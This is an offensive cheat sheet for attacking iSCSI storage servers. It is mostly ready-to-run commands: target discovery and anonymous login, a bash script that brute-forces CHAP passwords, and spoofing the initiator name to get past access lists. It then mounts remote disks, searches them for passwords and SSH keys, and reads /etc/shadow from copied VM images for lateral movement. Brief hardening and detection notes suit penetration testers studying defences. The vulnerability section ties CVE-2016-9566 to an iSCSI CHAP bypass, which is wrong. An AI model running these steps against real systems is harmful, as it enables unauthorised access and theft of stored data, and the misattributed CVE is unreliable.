# iSCSI ENUMERATION (Port 3260/TCP)

## SERVICE OVERVIEW
```
iSCSI (Internet Small Computer System Interface)
- Port: 3260/TCP
- Network storage protocol (SAN - Storage Area Network)
- Allows remote disk access over TCP/IP
- Stores data in block-level format
- May contain sensitive data, VMs, backups
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p3260 <IP>                            # Service/Version detection
nc -nv <IP> 3260                                # Manual connection
telnet <IP> 3260                                # Alternative connection
```

## NMAP ENUMERATION
```bash
# iSCSI detection
nmap -sV -p3260 <IP>                            # Version detection
nmap -p3260 --script iscsi-info <IP>            # iSCSI server info
nmap -p3260 --script iscsi-brute <IP>           # Brute force CHAP auth

# Comprehensive scan
nmap -sV -p3260 --script "iscsi-*" <IP> -oA iscsi_scan
```

## ISCSI DISCOVERY
```bash
# Install iSCSI tools
apt-get install open-iscsi                      # Debian/Ubuntu
yum install iscsi-initiator-utils               # RHEL/CentOS

# Discover iSCSI targets
iscsiadm -m discovery -t sendtargets -p <IP>

# Example output:
# 10.0.0.5:3260,1 iqn.2021-01.com.example:storage.target01
# 10.0.0.5:3260,1 iqn.2021-01.com.example:backup.target02

# Parse target names
iscsiadm -m discovery -t st -p <IP> | awk '{print $2}'
```

## ISCSI TARGET NAMING
```bash
# iSCSI Qualified Name (IQN) format:
# iqn.YYYY-MM.reverse-domain:unique-name

# Example:
# iqn.2021-01.com.example:storage.lun01
# iqn.2020-12.local.company:backup.disk

# Information from IQN:
# - Date (YYYY-MM): When naming scheme was created
# - Domain: Organization domain (reversed)
# - Unique name: Target identifier
```

## LOGIN TO ISCSI TARGET
```bash
# Login to discovered target (no authentication)
iscsiadm -m node -T <target_IQN> -p <IP> --login

# Example:
iscsiadm -m node -T iqn.2021-01.com.example:storage.target01 -p <IP>:3260 --login

# If successful:
# - New block device created (/dev/sdb, /dev/sdc, etc.)
# - Can mount and access data

# List active sessions
iscsiadm -m session

# Logout from target
iscsiadm -m node -T <target_IQN> -p <IP> --logout
```

## MOUNT AND ACCESS ISCSI DISK
```bash
# After successful login:

# List new block devices
lsblk
fdisk -l

# Find the new iSCSI disk (e.g., /dev/sdb)
dmesg | grep -i scsi

# Mount the disk
mkdir /mnt/iscsi
mount /dev/sdb1 /mnt/iscsi                      # If partitioned
mount /dev/sdb /mnt/iscsi                       # If not partitioned

# Access data
ls -la /mnt/iscsi
find /mnt/iscsi -type f -name "*.txt"
find /mnt/iscsi -type f -name "*.conf"

# Search for sensitive files
grep -r "password" /mnt/iscsi
find /mnt/iscsi -name "*.key" -o -name "*.pem"
```

## CHAP AUTHENTICATION
```bash
# CHAP (Challenge-Handshake Authentication Protocol)
# iSCSI may require CHAP credentials

# Configure CHAP credentials
iscsiadm -m node -T <target_IQN> -p <IP> --op update -n node.session.auth.authmethod -v CHAP
iscsiadm -m node -T <target_IQN> -p <IP> --op update -n node.session.auth.username -v <username>
iscsiadm -m node -T <target_IQN> -p <IP> --op update -n node.session.auth.password -v <password>

# Login with CHAP
iscsiadm -m node -T <target_IQN> -p <IP> --login

# Brute force CHAP (if required)
# Limited tool support, manual brute force needed
```

## BRUTE FORCE CHAP
```bash
# Nmap CHAP brute force
nmap -p3260 --script iscsi-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>

# Manual CHAP brute force
cat > iscsi_brute.sh <<'EOF'
#!/bin/bash
TARGET=$1
IP=$2
USERS=$3
PASSWORDS=$4

for user in $(cat $USERS); do
  for pass in $(cat $PASSWORDS); do
    iscsiadm -m node -T $TARGET -p $IP --op update -n node.session.auth.username -v $user > /dev/null 2>&1
    iscsiadm -m node -T $TARGET -p $IP --op update -n node.session.auth.password -v $pass > /dev/null 2>&1
    iscsiadm -m node -T $TARGET -p $IP --login > /dev/null 2>&1
    if [ $? -eq 0 ]; then
      echo "[+] Success: $user:$pass"
      exit 0
    fi
  done
done
EOF

chmod +x iscsi_brute.sh
./iscsi_brute.sh <target_IQN> <IP> users.txt passwords.txt
```

## ENUMERATE ISCSI TARGETS
```bash
# Get detailed target information
iscsiadm -m node -T <target_IQN> -p <IP> --op show

# Information revealed:
# - Target name (IQN)
# - Portal (IP:port)
# - Authentication method (None, CHAP)
# - Discovery method
# - Header/data digest
```

## COMMON MISCONFIGURATIONS
```
☐ No authentication required (anonymous access)
☐ Weak CHAP credentials (admin:admin, admin:password)
☐ iSCSI target exposed to internet
☐ No network segmentation (iSCSI on production network)
☐ Sensitive data stored unencrypted on iSCSI volumes
☐ Default IQN names (easy to guess)
☐ No access control lists (ACLs)
☐ Outdated iSCSI implementation with vulnerabilities
☐ No encryption (data sent in plaintext)
☐ iSCSI targets containing backups, VMs, databases
```

## VULNERABILITY SCANNING
```bash
# Search for iSCSI exploits
searchsploit iscsi

# Known vulnerabilities:
# CVE-2020-13867: Open-iSCSI targetcli ACL bypass
# CVE-2016-9566: iSCSI CHAP authentication bypass
# Various buffer overflows in old implementations

# Nmap vuln scan
nmap -p3260 --script vuln <IP>
```

## QUICK WIN CHECKLIST
```
☐ Scan for iSCSI on port 3260
☐ Discover available targets (iscsiadm discovery)
☐ Attempt to login without authentication
☐ If CHAP required, brute force credentials
☐ Login to target and list new block devices
☐ Mount iSCSI disk
☐ Search for sensitive files (passwords, keys, configs)
☐ Look for VM images, databases, backups
☐ Enumerate network topology from stored data
☐ Check for unencrypted sensitive data
```

## ONE-LINER ENUMERATION
```bash
# Quick iSCSI discovery
iscsiadm -m discovery -t sendtargets -p <IP>

# Attempt anonymous login
iscsiadm -m discovery -t st -p <IP> | awk '{print $2}' | while read target; do iscsiadm -m node -T $target -p <IP> --login; done
```

## SECURITY IMPLICATIONS
```
RISKS:
- Unauthorized access to storage volumes
- Data exfiltration (backups, databases, VMs)
- Data tampering/deletion
- Ransomware (encrypt iSCSI volumes)
- Credential theft (stored data contains passwords)
- VM compromise (if iSCSI stores VM images)
- Network topology disclosure
- Persistent backdoor (modify stored OS images)

DATA TYPICALLY FOUND:
- Virtual machine disk images (.vmdk, .vdi, .qcow2)
- Database files (MySQL, PostgreSQL, SQL Server)
- Full system backups
- Application data
- Configuration files with credentials
- Email archives
- File shares (SMB, NFS data)

RECOMMENDATIONS:
- Implement CHAP authentication (strong passwords)
- Use IPsec for encryption (iSCSI over IPsec)
- Restrict iSCSI to dedicated storage VLAN
- Implement ACLs (initiator IQN whitelist)
- Never expose iSCSI to internet
- Use VPN for remote iSCSI access
- Regular security audits
- Monitor iSCSI access logs
- Encrypt sensitive data at rest
- Network segmentation (separate storage network)
```

## ISCSI INITIATOR IQN
```bash
# Each iSCSI client has an initiator IQN
# Some targets use ACLs to restrict access by initiator IQN

# Get your initiator IQN
cat /etc/iscsi/initiatorname.iscsi
# Example: InitiatorName=iqn.1993-08.org.debian:01:1234567890

# Change initiator IQN (to match allowed list)
echo "InitiatorName=iqn.2021-01.com.example:client01" > /etc/iscsi/initiatorname.iscsi
systemctl restart iscsid
```

## TOOLS
```bash
# iscsiadm (iSCSI initiator)
apt-get install open-iscsi
iscsiadm -m discovery -t st -p <IP>

# Nmap
nmap -p3260 --script iscsi-* <IP>

# targetcli (iSCSI target management - if server access)
apt-get install targetcli-fb
targetcli ls

# lsscsi (list SCSI devices)
apt-get install lsscsi
lsscsi

# multipath (if using multipath I/O)
multipath -ll
```

## POST-EXPLOITATION
```bash
# After mounting iSCSI disk:

# 1. Search for credentials
grep -ri "password" /mnt/iscsi
find /mnt/iscsi -name "*.conf" -exec grep -i "password\|user" {} \;

# 2. Look for SSH keys
find /mnt/iscsi -name "id_rsa" -o -name "*.pem"

# 3. Find VM images
find /mnt/iscsi -name "*.vmdk" -o -name "*.vdi" -o -name "*.qcow2"

# 4. Mount nested filesystems (if VM images found)
qemu-nbd -r -c /dev/nbd0 /mnt/iscsi/vm_disk.qcow2
mount /dev/nbd0p1 /mnt/vm
# Access VM filesystem

# 5. Database files
find /mnt/iscsi -name "*.mdf" -o -name "*.frm" -o -name "*.ibd"

# 6. Backup files
find /mnt/iscsi -name "*.bak" -o -name "*.sql" -o -name "*.dump"
```

## DEFENSE DETECTION
```bash
# Monitor for unauthorized iSCSI access:
# - Connections from unexpected IPs
# - Login attempts from unknown initiator IQNs
# - Failed CHAP authentication
# - Unusual data transfer patterns
# - Target discovery scans

# iSCSI target logs (Linux)
journalctl -u targetd -f
tail -f /var/log/syslog | grep -i iscsi

# Check active sessions (server-side)
targetcli sessions ls

# Audit iSCSI configuration
targetcli ls
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover iSCSI targets
iscsiadm -m discovery -t st -p <IP>

# 2. Attempt anonymous login
iscsiadm -m node -T <target_IQN> -p <IP> --login

# 3. Mount and access disk
mount /dev/sdb /mnt/iscsi

# 4. Search for VM images
find /mnt/iscsi -name "*.vmdk"

# 5. Extract VM disk
cp /mnt/iscsi/vm_image.vmdk /tmp/

# 6. Mount VM disk offline
qemu-nbd -c /dev/nbd0 /tmp/vm_image.vmdk
mount /dev/nbd0p1 /mnt/vm

# 7. Extract credentials from VM
cat /mnt/vm/etc/shadow
cat /mnt/vm/etc/passwd

# 8. Use credentials for lateral movement
ssh user@<IP> -i /mnt/vm/home/user/.ssh/id_rsa
```
